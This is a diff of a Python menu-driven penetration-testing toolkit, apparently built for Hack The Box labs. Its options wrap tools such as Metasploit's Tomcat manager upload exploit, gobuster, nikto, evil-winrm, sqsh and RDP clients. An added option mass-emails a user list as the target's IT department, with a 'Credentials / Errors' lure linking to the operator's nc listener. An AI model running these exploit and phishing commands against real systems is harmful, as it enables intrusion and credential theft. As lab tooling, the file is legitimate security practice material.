-#------------------------------------------------------------------------------------- 
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='70':
+      command("msfdb init")
+      command("service postgresql start")
       command("touch meterpreter.rc")
       command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
       command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
@@ -2371,10 +1782,10 @@ while True:
       prompt() 
       os.remove("meterpreter.rc")      
       
-#------------------------------------------------------------------------------------- 
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Exit (1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2382,197 +1793,248 @@ while True:
    if selection =='71':
       exit(1)  
       
- #------------------------------------------------------------------------------------- 
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='72':
       exit(1)          
-      
-#------------------------------------------------------------------------------------- 
+
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='73':
-      exit(1)    
-      
- #------------------------------------------------------------------------------------- 
+      exit(1)
+
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='74':
-      exit(1)    
- 
- #------------------------------------------------------------------------------------- 
+      exit(1)
+      
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - GOBUSTER 
+# Version : BANK
+# Details : Menu option selected - swaks experimental!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='75':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote Domain serevr has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         command("ip a s tun0 | awk '/inet/ {print $2}' > ip.tmp")	# tun0 = HTB
+         localip = linecache.getline("ip.tmp",1)
+         localip = localip.rstrip("\n")
+         localip,null = localip.split("/")
+         command("gnome-terminal --tab --title 'WinMaster - MailForce' -e 'nc -nvlp 80'")
+         command("while read mail; do swaks -to $mail -from it@" + DOM.rstrip(" ") + " -header 'Subject: Credentials / Errors' -body 'goto http://" + localip + "' -server " + TIP.rstrip(" ") + "; done < usernames.txt")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - Nikto
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='76':
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+      else:
+         if WEB[:5] != "EMPTY":
+            command("nikto -h " + WEB.rstrip(" "))
+         else:
+            command("nikto -h " + TIP.rstrip(" "))
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='77':
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
       else:
          if WEB[:5] != "EMPTY":
             command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
          else:
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
+            if WEB[:5].upper == "HTTPS":
+               command("gobuster dir -k -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50") 
+            else: 
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
       prompt()
       
- #------------------------------------------------------------------------------------- 
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - FTP IP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='76':
-      if TIP[:5] != "EMPTY":
-         command("ftp " + TIP.rstrip(" "))
-      prompt() 
-      
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - TFPS IP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='77':
-      if TIP[:5] != "EMPTY":
-         command("tftp " + TIP.rstrip(" "))
-      prompt() 
-      
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - SFTP IP
+# Version : BANK
+# Details : Menu option selected - FTP PORT 21
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='78':
       if TIP[:5] != "EMPTY":
-         command("sftp " + TIP.rstrip(" "))
-      prompt()
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - PFTP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='79':
-      if TIP[:5] != "EMPTY":
-         command("pftp " + TIP.rstrip(" "))
+         command("ftp " + TIP.rstrip(" ") + " 21")
       prompt()       
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected -  sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go
+# Version : BANK
+# Details : Menu option selected - ssh -l USER IP -p PORT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='80':
+   if selection =='79':
       if TIP[:5] != "EMPTY":
-         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
+         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ssh -l USER IP.
+# Version : BANK
+# Details : Menu option selected - ssh -i id USER@IP -p 22
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='80':
+      if TIP[:5] != "EMPTY":
+         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - telnet -l USER IP PORT.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
       if TIP[:5] != "EMPTY":
-         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
       prompt()
       
-#------------------------------------------------------------------------------------- 
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ssh -i id USER@IP
+# Version : BANK
+# Details : Menu option selected - nc IP PORT.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
       if TIP[:5] != "EMPTY":
-         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         command("nc " + TIP.rstrip(" ") + " 80")
       prompt()
-
-#------------------------------------------------------------------------------------- 
+      
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Exit(1)
+# Version : BANK
+# Details : Menu option selected - sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='83':
       if TIP[:5] != "EMPTY":
-         command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
+         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
       prompt()
-
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - telnet -l USER IP.
+# Version : BANK
+# Details : Menu option selected - MSSQLCLIENT PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
       if TIP[:5] != "EMPTY":
-         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+         if DOM[:5] != "EMPTY":
+            command(PATH + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         else:
+            command(PATH + "mssqlclient.py " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - nc IP.
+# Version : BANK
+# Details : Menu option selected - MYSQL PORT 3306
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
       if TIP[:5] != "EMPTY":
-         command("nc " + TIP.rstrip(" "))
+         command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Windows remote login on POR 5985.
+# Version : BANK
+# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='86':
+      if TIP[:5] != "EMPTY":
+         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - Xfreeredp
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '87':
+      if TIP[:5] != "EMPTY":
+         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
+      prompt()    
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - Windows remote login on POR 5985.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='88':
       CheckParams = 0      
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP has not been specified...")
@@ -2592,38 +2054,12 @@ while True:
                     
       if CheckParams == 0:
          command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='87':
-      if TIP[:5] != "EMPTY":
-         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - Xfreeredp
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '88':
-      if TIP[:5] != "EMPTY":
-         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
-      prompt()     
+      prompt() 
                  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
